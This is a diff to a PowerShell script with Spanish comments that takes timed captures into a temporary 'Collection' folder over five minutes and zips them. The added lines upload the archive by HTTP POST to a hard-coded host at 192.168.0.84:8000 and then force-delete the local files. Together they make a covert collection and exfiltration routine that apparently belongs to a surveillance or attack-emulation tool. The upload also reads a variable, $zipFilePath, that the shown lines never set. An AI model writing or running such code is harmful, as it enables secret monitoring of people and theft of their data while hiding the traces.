@@ -7,6 +7,8 @@ $totalTime = 300  # Duración total en segundos
 $interval = 3    # Intervalo entre capturas en segundos
 $numberOfCaptures = $totalTime / $interval
 
+$destinationUrl = "http://192.168.0.84:8000/"
+
 $outputDir = "$env:TEMP\Collection\"
 if (-not (Test-Path $outputDir)) {
     New-Item -ItemType Directory -Path $outputDir
@@ -24,5 +26,7 @@ for ($i = 0; $i -lt $numberOfCaptures; $i++) {
     Start-Sleep -Seconds $interval
 }
 
-
 [IO.Compression.ZipFile]::CreateFromDirectory($outputDir, "$env:TEMP\collection.zip")
+$fileContent = Get-Item -Path $zipFilePath
+Invoke-RestMethod -Uri $destinationUrl -Method Post -InFile $fileContent.FullName -ContentType "application/zip"
+Get-ChildItem -Path $outputDir | Remove-Item -Recurse -Force
